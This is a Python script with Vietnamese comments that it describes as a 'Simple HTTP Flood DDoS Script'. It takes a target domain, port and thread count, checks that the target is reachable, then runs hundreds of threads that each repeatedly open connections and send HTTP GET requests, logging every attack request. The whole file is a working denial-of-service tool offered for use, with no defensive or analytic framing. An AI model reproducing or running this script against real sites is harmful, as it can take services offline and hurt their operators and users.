import socket
import threading
import time
import sys
import argparse
import urllib.parse

# Cấu hình mặc định
DEFAULT_THREADS = 500  # Giảm số luồng mặc định để tránh lỗi
TARGET = "site"
PORT = 80  # Cổng HTTP mặc định là 80

# Biến toàn cục
request_count = 0
stop_event = threading.Event()

def parse_arguments():
    """Xử lý tham số dòng lệnh để tùy chỉnh số luồng."""
    parser = argparse.ArgumentParser(description="Simple HTTP Flood DDoS Script")
    parser.add_argument("--target", default=TARGET, help="Target domain")
    parser.add_argument("--port", type=int, default=PORT, help="Target port")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Number of threads")
    return parser.parse_args()

def check_target(target, port):
    """Kiểm tra xem target có thể truy cập không trước khi tấn công."""
    try:
        # Chuyển đổi tên miền thành IP
        ip_address = socket.gethostbyname(target)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)  # Timeout 2 giây
        s.connect((ip_address, port))
        print(f"[INFO] Kết nối tới {target} ({ip_address}:{port}) thành công. Bắt đầu tấn công...")
        s.close()
        return True
    except Exception as e:
        print(f"[ERROR] Không thể kết nối tới {target} - Lỗi: {e}")
        return False

def attack(target, port):
    """Hàm tấn công: gửi yêu cầu HTTP GET liên tục."""
    global request_count
    while not stop_event.is_set():
        s = None
        try:
            # Chuyển đổi tên miền thành IP
            ip_address = socket.gethostbyname(target)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)  # Timeout 1 giây để tránh treo
            s.connect((ip_address, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            request_count += 1
            current_time = time.strftime("%H:%M:%S")
            print(f"[{current_time}] [Tấn công] Yêu cầu #{request_count} gửi tới {target} ({ip_address}:{port}) - Thành công")
            time.sleep(0.01)  # Thêm độ trễ 10ms để tránh quá tải ngay lập tức
        except Exception as e:
            current_time = time.strftime("%H:%M:%S")
            print(f"[{current_time}] [Tấn công] Yêu cầu #{request_count} gửi tới {target} - Thất bại - Lỗi: {e}")
        finally:
            if s:
                s.close()  # Đóng socket để tránh lỗi "Too many open files"

def main():
    # Lấy tham số từ dòng lệnh
    args = parse_arguments()
    target = args.target
    port = args.port
    num_threads = args.threads

    # Kiểm tra kết nối ban đầu
    if not check_target(target, port):
        print("[ERROR] Thoát chương trình do không thể kết nối tới mục tiêu.")
        sys.exit(1)

    # Khởi tạo các luồng
    threads = []
    print(f"[INFO] Khởi tạo {num_threads} luồng để tấn công {target}:{port}...")
    for i in range(num_threads):
        t = threading.Thread(target=attack, args=(target, port))
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)  # Giữ chương trình chạy
    except KeyboardInterrupt:
        print("\n[Dừng] Nhận lệnh dừng tấn công...")
        stop_event.set()  # Dừng tất cả luồng
        for t in threads:
            t.join()
        print("[Dừng] Tấn công đã dừng hoàn toàn.")
        sys.exit(0)

if __name__ == "__main__":
    main()
